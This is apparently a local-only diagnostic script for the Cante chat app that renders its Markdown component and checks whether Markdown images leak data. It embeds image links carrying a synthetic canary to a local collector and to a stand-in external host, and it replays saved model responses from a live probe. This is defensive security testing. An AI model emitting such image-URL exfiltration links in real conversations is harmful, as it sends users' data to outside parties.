/** Local-only diagnostic renderer/collector. No customer/session data.
 * Usage: node scripts/probe-chat-markdown.mjs --local [private-results-directory]
 * GET /probe renders the REAL chat Markdown component with a fictional marker.
 * GET /model/<case> renders a saved synthetic-model response from the live probe.
 * GET /proof shows requests received by this local collector.
 */
import {createRequire} from 'node:module';
import {createServer} from 'node:http';
import {mkdirSync,readFileSync,appendFileSync} from 'node:fs';
import {resolve,join} from 'node:path';
import {pathToFileURL} from 'node:url';
const [mode,results]=process.argv.slice(2);if(mode!=='--local')throw Error('Explicit --local is required.');
const require=createRequire(import.meta.url),tsxRequire=createRequire(require.resolve('tsx')),{build}=tsxRequire('esbuild');
const out=resolve('output/security-probe');mkdirSync(out,{recursive:true});
const bundle=join(out,'markdown.mjs');await build({entryPoints:[resolve('components/chat/markdown.tsx')],outfile:bundle,bundle:true,platform:'node',format:'esm',jsx:'automatic',packages:'external'});
const {Markdown}=await import(pathToFileURL(bundle)),React=await import('react'),{renderToStaticMarkup}=await import('react-dom/server');
const requests=[];const fixture='SYNTHETIC_MARKDOWN_CANARY';
const csp="default-src 'self'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://*.supabase.co wss://*.supabase.co";
const server=createServer((req,res)=>{const url=new URL(req.url,'http://localhost:3134');
 if(url.pathname==='/collect'){const proof={at:new Date().toISOString(),path:url.pathname,marker:url.searchParams.get('value'),source:url.searchParams.get('source')};requests.push(proof);appendFileSync(join(out,'collector.jsonl'),JSON.stringify(proof)+'\n',{mode:0o600});console.log(JSON.stringify({receivedSyntheticImageRequest:true,...proof}));res.writeHead(200,{'content-type':'image/gif','cache-control':'no-store'});res.end(Buffer.from('R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=','base64'));return;}
 if(url.pathname==='/proof'){res.writeHead(200,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({requests}));return;}
 let markdown=`Synthetic security diagnostic.\n\n![Supplier badge](http://localhost:3134/collect?source=renderer&value=${fixture})\n\nThis marker is fictional and the collector is local.`;
 if(url.pathname==='/external-probe')markdown=`Synthetic HTTPS egress diagnostic.\n\n![Supplier badge](https://cante-synthetic-collector.invalid/collect?value=${fixture})`;
 if(url.pathname.startsWith('/model/')){const name=url.pathname.slice(7);if(!results||!/^[a-z-]+$/.test(name)){res.writeHead(404);res.end();return;}try{const sse=readFileSync(join(results,name+'.sse'),'utf8');markdown=sse.split('\n').filter(l=>l.startsWith('data: ')).map(l=>JSON.parse(l.slice(6))).filter(e=>e.type==='text').map(e=>e.text??'').join('');}catch{res.writeHead(404);res.end();return;}}
 res.writeHead(200,{'content-type':'text/html; charset=utf-8','cache-control':'no-store','content-security-policy':csp,'referrer-policy':'strict-origin-when-cross-origin','x-content-type-options':'nosniff'});
 res.end('<!doctype html><meta charset="utf-8"><title>Cante synthetic Markdown security probe</title><h1>Synthetic security diagnostic</h1>'+renderToStaticMarkup(React.createElement(Markdown,{children:markdown})));
});server.listen(3134,'127.0.0.1',()=>console.log(JSON.stringify({localRenderer:'http://localhost:3134/probe',actualCanteMarkdown:true,productionCspApplied:true})));
